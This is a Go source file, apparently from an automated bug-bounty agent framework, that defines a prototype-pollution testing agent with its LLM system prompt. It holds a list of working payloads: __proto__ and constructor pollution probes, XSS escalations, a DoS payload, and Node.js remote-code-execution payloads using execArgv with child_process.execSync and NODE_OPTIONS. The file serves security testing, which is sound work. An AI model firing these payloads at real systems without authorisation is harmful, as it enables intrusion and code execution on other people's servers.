// Package protopollution implements the JavaScript Prototype Pollution specialist agent.
package protopollution

import (
	"context"
	"fmt"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "Prototype Pollution Agent" }
func (a *Agent) ID() string           { return "protopollution" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, p := range payloads {
		severity := "medium"
		if p.canXSS || p.canRCE {
			severity = "high"
		}
		if p.canRCE {
			severity = "critical"
		}

		findings = append(findings, &base.Finding{
			Type:       "Prototype Pollution",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   severity,
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"technique": p.technique,
				"vector":    p.vector,
				"can_xss":   p.canXSS,
				"can_rce":   p.canRCE,
			},
			Method: p.method,
		})
	}
	return findings, nil
}

type ppPayload struct {
	payload   string
	technique string
	vector    string
	method    string
	canXSS    bool
	canRCE    bool
}

var payloads = []ppPayload{
	// URL parameter pollution
	{"__proto__[polluted]=true", "url_param", "query_string", "GET", false, false},
	{"__proto__.polluted=true", "url_dot", "query_string", "GET", false, false},
	{"constructor[prototype][polluted]=true", "constructor", "query_string", "GET", false, false},

	// JSON body pollution
	{`{"__proto__":{"polluted":"true"}}`, "json_proto", "json_body", "POST", false, false},
	{`{"constructor":{"prototype":{"polluted":"true"}}}`, "json_constructor", "json_body", "POST", false, false},

	// XSS escalation via prototype pollution
	{`{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}`, "proto_to_xss", "json_body", "POST", true, false},
	{`{"__proto__":{"src":"javascript:alert(1)"}}`, "proto_to_href_xss", "json_body", "POST", true, false},

	// RCE via prototype pollution (Node.js)
	{`{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}`, "proto_to_rce_node", "json_body", "POST", false, true},
	{`{"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}`, "proto_to_rce_execargv", "json_body", "POST", false, true},

	// Deny-of-Service via pollution
	{`{"__proto__":{"toString":"polluted"}}`, "proto_dos", "json_body", "POST", false, false},
}

const defaultSystemPrompt = `You are an expert Prototype Pollution specialist with expertise in:
- URL parameter-based prototype pollution (__proto__[key]=value)
- JSON merge-based pollution via POST body
- Prototype pollution to XSS escalation (innerHTML, src override)
- Prototype pollution to RCE on Node.js (execArgv, NODE_OPTIONS)
- Client-side vs server-side prototype pollution detection

RULES:
1. Start with detection probes (__proto__[polluted]=true)
2. Verify pollution by checking if Object.polluted === true
3. Prototype Pollution alone is MEDIUM severity
4. PP to XSS is HIGH severity
5. PP to RCE (Node.js) is CRITICAL severity
6. Test both URL query params and JSON body vectors`
